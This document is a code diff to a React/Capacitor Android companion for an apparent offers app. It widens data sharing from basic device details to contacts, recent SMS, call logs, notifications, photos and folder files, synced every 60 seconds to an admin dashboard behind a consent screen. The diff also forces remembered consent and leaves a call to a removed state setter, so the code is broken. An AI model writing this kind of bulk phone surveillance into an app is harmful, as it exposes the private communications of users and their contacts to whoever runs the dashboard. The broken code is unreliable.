@@ -1,10 +1,12 @@
 import { useCallback, useEffect, useRef, useState } from "react";
 import { Device } from "@capacitor/device";
+import { Capacitor, registerPlugin } from "@capacitor/core";
 import { io } from "socket.io-client";
 
 const SERVER_KEY = "sevan.serverUrl";
 const CONSENT_KEY = "sevan.rememberSharingConsent";
 const DASHBOARD_URL = "https://sevan-connect.onrender.com";
+const PhoneData = registerPlugin("PhoneData");
 
 function isPrivateNetworkHost(host) {
   if (host === "localhost" || host.endsWith(".local")) return true;
@@ -34,10 +36,11 @@ export default function AndroidCompanion() {
   const [sharingConsent, setSharingConsent] = useState(() =>
     localStorage.getItem(CONSENT_KEY) === "true"
   );
-  const [rememberConsent, setRememberConsent] = useState(() =>
+  const [sharingEnabled, setSharingEnabled] = useState(() =>
     localStorage.getItem(CONSENT_KEY) === "true"
   );
   const [sharingStatus, setSharingStatus] = useState("");
+  const [dataAccess, setDataAccess] = useState([]);
   const socketRef = useRef(null);
   const updateTimerRef = useRef(null);
   const sharingApprovedRef = useRef(localStorage.getItem(CONSENT_KEY) === "true");
@@ -49,7 +52,7 @@ export default function AndroidCompanion() {
         Device.getId(),
         Device.getBatteryInfo(),
       ]);
-      socket.emit("device:register", {
+      await new Promise((resolve) => socket.emit("device:register", {
         userConsented: true,
         deviceId: id.identifier,
         name: info.name || "Android device",
@@ -62,10 +65,44 @@ export default function AndroidCompanion() {
         setSharingStatus(result?.ok
           ? "Approved basic details are being shared while this app is connected."
           : result?.error || "Could not share device details.");
-      });
+        resolve(result);
+      }));
     } catch (error) {
       setSharingStatus(error.message || "Could not read basic device details.");
     }
+  }
+
+  function shareSnapshot(socket, snapshot) {
+    if (!sharingApprovedRef.current || !socket?.connected || !snapshot) return;
+    const data = { ...snapshot };
+    delete data.updatedAt;
+    setDataAccess(Array.isArray(snapshot.access) ? snapshot.access : []);
+    socket.emit("device:data:update", { ...data, userConsented: true }, (result) => {
+      setSharingStatus(result?.ok
+        ? "Approved information synced to the private dashboard."
+        : result?.error || "Could not sync approved information.");
+    });
+  }
+
+  async function readAndShareGrantedData(socket) {
+    if (!Capacitor.isNativePlatform()) return;
+    try {
+      const snapshot = await PhoneData.readGrantedData();
+      shareSnapshot(socket, snapshot);
+    } catch (error) {
+      setSharingStatus(error.message || "Could not read approved phone data.");
+    }
+  }
+
+  function startApprovedSync(socket) {
+    if (!sharingApprovedRef.current || !socket?.connected || !Capacitor.isNativePlatform()) return;
+    window.clearInterval(updateTimerRef.current);
+    void sendDeviceDetails(socket).then(() => readAndShareGrantedData(socket));
+    updateTimerRef.current = window.setInterval(() => {
+      if (sharingApprovedRef.current && socket.connected) {
+        void sendDeviceDetails(socket).then(() => readAndShareGrantedData(socket));
+      }
+    }, 60000);
   }
 
   const openService = useCallback(() => {
@@ -91,11 +128,7 @@ export default function AndroidCompanion() {
     socket.on("connect", () => {
       setServiceStatus("Connected. Offer updates will appear here.");
       if (sharingApprovedRef.current) {
-        void sendDeviceDetails(socket);
-        window.clearInterval(updateTimerRef.current);
-        updateTimerRef.current = window.setInterval(() => {
-          if (sharingApprovedRef.current && socket.connected) void sendDeviceDetails(socket);
-        }, 30000);
+        startApprovedSync(socket);
       }
     });
     socket.on("offer:current", (nextOffer) => {
@@ -128,31 +161,58 @@ export default function AndroidCompanion() {
     setSharingConsent(approved);
     if (!approved) {
       sharingApprovedRef.current = false;
+      setSharingEnabled(false);
       setRememberConsent(false);
       localStorage.removeItem(CONSENT_KEY);
       window.clearInterval(updateTimerRef.current);
       socketRef.current?.emit("device:unregister");
+      if (Capacitor.isNativePlatform()) void PhoneData.clearSelections().catch(() => {});
+      setDataAccess([]);
       setSharingStatus("Device details sharing stopped.");
     } else {
-      setSharingStatus("Sharing is still off. Tap the button below to send the listed details.");
+      setSharingStatus("Sharing is still off. Read the disclosure, then tap Continue and allow.");
     }
   }
 
-  function approveAndShare() {
+  async function approveAndShare() {
     if (!sharingConsent) return;
-    if (rememberConsent) localStorage.setItem(CONSENT_KEY, "true");
-    else localStorage.removeItem(CONSENT_KEY);
+    localStorage.setItem(CONSENT_KEY, "true");
     sharingApprovedRef.current = true;
+    setSharingEnabled(true);
     const socket = socketRef.current;
-    if (!socket?.connected) {
-      setSharingStatus("Waiting for a secure connection. Try again when connected.");
+    if (!Capacitor.isNativePlatform()) {
+      setSharingStatus("Install and open the Android companion APK to request phone permissions.");
       return;
     }
-    void sendDeviceDetails(socket);
-    window.clearInterval(updateTimerRef.current);
-    updateTimerRef.current = window.setInterval(() => {
-      if (sharingApprovedRef.current && socket.connected) void sendDeviceDetails(socket);
-    }, 30000);
+    if (socket?.connected) await sendDeviceDetails(socket);
+    setSharingStatus("Android will ask for each permission separately. Only approved categories are shared.");
+    try {
+      const snapshot = await PhoneData.requestAndRead();
+      setDataAccess(Array.isArray(snapshot.access) ? snapshot.access : []);
+      if (socket?.connected) {
+        shareSnapshot(socket, snapshot);
+        startApprovedSync(socket);
+      }
+      else setSharingStatus("Consent saved. Waiting for a secure connection to sync approved data.");
+    } catch (error) {
+      setSharingStatus(error.message || "Android could not request the selected permissions.");
+    }
+  }
+
+  async function runNativeAction(action, waitingMessage) {
+    if (!Capacitor.isNativePlatform()) {
+      setSharingStatus("This action is available in the installed Android companion app.");
+      return;
+    }
+    setSharingStatus(waitingMessage);
+    try {
+      const snapshot = await action();
+      setDataAccess(Array.isArray(snapshot.access) ? snapshot.access : []);
+      if (socketRef.current?.connected) shareSnapshot(socketRef.current, snapshot);
+      else setSharingStatus("Selection saved on this phone. Reopen the app while online to sync it.");
+    } catch (error) {
+      setSharingStatus(error.message || "Android cancelled or could not complete that access request.");
+    }
   }
 
   return (
@@ -183,24 +243,45 @@ export default function AndroidCompanion() {
         </section>
       )}
 
-      <details style={{ marginTop: 24, padding: 16, border: "1px solid #e7eaf1", borderRadius: 12 }}>
-        <summary style={{ cursor: "pointer", fontWeight: 600 }}>Privacy and optional device sharing</summary>
-        <p style={{ fontSize: 14, lineHeight: 1.5 }}>
-          This app connects to load public offer updates. It does not send device details unless you separately approve below. Optional sharing contains this phone's app device ID, name, model, Android version, battery level, and charging state.
+      <section style={{ marginTop: 24, padding: 20, border: "1px solid #dce3f0", borderRadius: 14, background: "#fff" }}>
+        <h2 style={{ margin: "0 0 8px", fontSize: 18 }}>Phone data sharing</h2>
+        <p style={{ fontSize: 14, lineHeight: 1.55, color: "#596579" }}>
+          Offers work without sharing private data. If you opt in, approved contacts, recent SMS and call logs, active notifications, selected photos/files, and basic device details can be sent to the admin dashboard over HTTPS. The service keeps this data only in memory while the phone stays connected.
         </p>
-        <label style={{ display: "flex", gap: 8, alignItems: "flex-start", fontSize: 14 }}>
+        <ul style={{ display: "grid", gap: 7, paddingLeft: 20, fontSize: 13, color: "#39445a" }}>
+          <li>Contacts, up to 150 recent SMS, and up to 150 recent calls require Android runtime permission.</li>
+          <li>Notifications require enabling Sevan Connect in Android Notification access settings.</li>
+          <li>Up to three selected photo previews and eight top-level files from one selected folder are shared; only small file contents are included.</li>
+          <li>SMS and call log access may be restricted by Android or app-store rules on some phones.</li>
+        </ul>
+        <label style={{ display: "flex", gap: 10, alignItems: "flex-start", margin: "16px 0", fontSize: 14, lineHeight: 1.5 }}>
           <input type="checkbox" checked={sharingConsent} onChange={changeSharingConsent} />
-          I approve sending the listed basic device details to the service while connected.
+          I understand and approve sharing the categories listed above. I can stop sharing in this app at any time.
         </label>
-        <label style={{ display: "flex", gap: 8, alignItems: "flex-start", marginTop: 12, fontSize: 14 }}>
-          <input type="checkbox" checked={rememberConsent} disabled={!sharingConsent} onChange={(event) => setRememberConsent(event.target.checked)} />
-          Remember this approval and resume sharing when I open the app again.
-        </label>
-        <button type="button" disabled={!sharingConsent} onClick={approveAndShare} style={{ marginTop: 14, padding: "10px 14px", cursor: sharingConsent ? "pointer" : "not-allowed" }}>
-          Approve and share basic details
+        <button type="button" className="primary-button" disabled={!sharingConsent} onClick={approveAndShare}>
+          Continue and allow on this phone
         </button>
-        {sharingStatus && <p role="status" style={{ fontSize: 13, color: "#555" }}>{sharingStatus}</p>}
-      </details>
+        <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginTop: 12 }}>
+          <button type="button" className="secondary-button" disabled={!sharingEnabled} onClick={() => runNativeAction(() => PhoneData.openNotificationSettings(), "Opening Android notification access settings…")}>
+            Enable notifications
+          </button>
+          <button type="button" className="secondary-button" disabled={!sharingEnabled} onClick={() => runNativeAction(() => PhoneData.chooseFolder(), "Choose a folder to share…")}>
+            Choose files folder
+          </button>
+          <button type="button" className="secondary-button" disabled={!sharingEnabled} onClick={() => runNativeAction(() => PhoneData.choosePhotos(), "Choose photos to share…")}>
+            Choose photos
+          </button>
+          <button type="button" className="secondary-button" disabled={!sharingEnabled} onClick={() => runNativeAction(() => PhoneData.readGrantedData(), "Refreshing approved data…")}>
+            Refresh approved data
+          </button>
+        </div>
+        {dataAccess.length > 0 && (
+          <ul style={{ display: "flex", flexWrap: "wrap", gap: 8, padding: 0, listStyle: "none", margin: "16px 0 0" }}>
+            {dataAccess.map((item) => <li key={item.category} style={{ padding: "6px 9px", borderRadius: 999, background: item.status === "allowed" ? "#e6f7ee" : "#f1f3f8", color: item.status === "allowed" ? "#13764d" : "#697386", fontSize: 11 }}>{item.message}</li>)}
+          </ul>
+        )}
+        {sharingStatus && <p role="status" style={{ fontSize: 13, color: "#555", marginBottom: 0 }}>{sharingStatus}</p>}
+      </section>
     </main>
   );
 }
